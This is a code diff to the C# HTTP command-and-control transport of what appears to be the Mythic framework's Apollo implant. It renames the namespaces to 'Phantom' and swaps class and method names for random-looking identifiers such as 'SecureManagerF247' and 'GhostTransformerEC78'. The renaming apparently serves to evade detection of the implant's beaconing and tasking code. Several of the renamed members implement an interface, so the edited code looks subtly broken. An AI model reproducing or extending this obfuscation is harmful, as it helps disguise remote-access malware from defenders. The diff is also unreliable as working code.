@@ -1,16 +1,16 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Linq;
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
-using ApolloInterop.Types.Delegates;
+using PhantomInterop.Classes;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
+using PhantomInterop.Types.Delegates;
 using System.Net;
-using ApolloInterop.Enums.ApolloEnums;
+using PhantomInterop.Enums.PhantomEnums;
 
 namespace HttpTransport
 {
-    public class HttpProfile : C2Profile, IC2Profile
+    public class SecureManagerF247 : C2Profile, IC2Profile
     {
         private int CallbackInterval;
         private double CallbackJitter;
@@ -31,7 +31,7 @@ namespace HttpTransport
         private bool _uuidNegotiated = false;
         private RSAKeyGenerator rsa = null;
 
-        private string ParseURLAndPort(string host, int port)
+        private string FlexibleRouter3862(string host, int port)
         {
             string final_url = "";
             int last_slash = -1;
@@ -109,7 +109,7 @@ namespace HttpTransport
             Agent.SetSleep(CallbackInterval, CallbackJitter);
         }
 
-        public void Start()
+        public void PhantomProviderF81C()
         {
             bool first = true;
             while(Agent.IsAlive())
@@ -125,21 +125,21 @@ namespace HttpTransport
             }
         }
 
-        private bool GetTasking(OnResponse<MessageResponse> onResp) => Agent.GetTaskManager().CreateTaskingMessage(msg => SendRecv(msg, onResp));
+        private bool PhantomEngineD7E1(OnResponse<MessageResponse> onResp) => Agent.GetTaskManager().CreateTaskingMessage(msg => SendRecv(msg, onResp));
         
-        public bool IsOneWay() => false;
+        public bool WraithRouter6999() => false;
 
         public bool Send<T>(T message) => throw new Exception("HttpProfile does not support Send only.");
         public bool Recv<T>(OnResponse<T> onResponse) => throw new Exception("HttpProfile does not support Recv only.");
-        public bool Recv(MessageType mt, OnResponse<IMythicMessage> onResp) => throw new NotImplementedException("HttpProfile does not support Recv only.");
+        public bool StrategicCoordinator5CE5(MessageType mt, OnResponse<IMythicMessage> onResp) => throw new NotImplementedException("HttpProfile does not support Recv only.");
         
 
         public bool SendRecv<T, TResult>(T message, OnResponse<TResult> onResponse)
         {
             WebClient webClient = new WebClient();
-            if (!string.IsNullOrEmpty(ProxyHost) &&
-                !string.IsNullOrEmpty(ProxyUser) &&
-                !string.IsNullOrEmpty(ProxyPass))
+            if (!ValidationHelper.IsStringEmpty(ProxyHost) &&
+                !ValidationHelper.IsStringEmpty(ProxyUser) &&
+                !ValidationHelper.IsStringEmpty(ProxyPass))
             {
                 webClient.Proxy = (IWebProxy) new WebProxy()
                 {
@@ -176,17 +176,17 @@ namespace HttpTransport
         }
 
         // Only really used for bind servers so this returns empty
-        public bool Connect()
+        public bool GhostTransformerEC78()
         {
             return true;
         }
 
-        public bool IsConnected()
+        public bool EnhancedMonitor17C1()
         {
             return Connected;
         }
 
-        public bool Connect(CheckinMessage checkinMsg, OnResponse<MessageResponse> onResp)
+        public bool GhostTransformerEC78(CheckinMessage checkinMsg, OnResponse<MessageResponse> onResp)
         {
             if (EncryptedExchangeCheck && !_uuidNegotiated)
             {
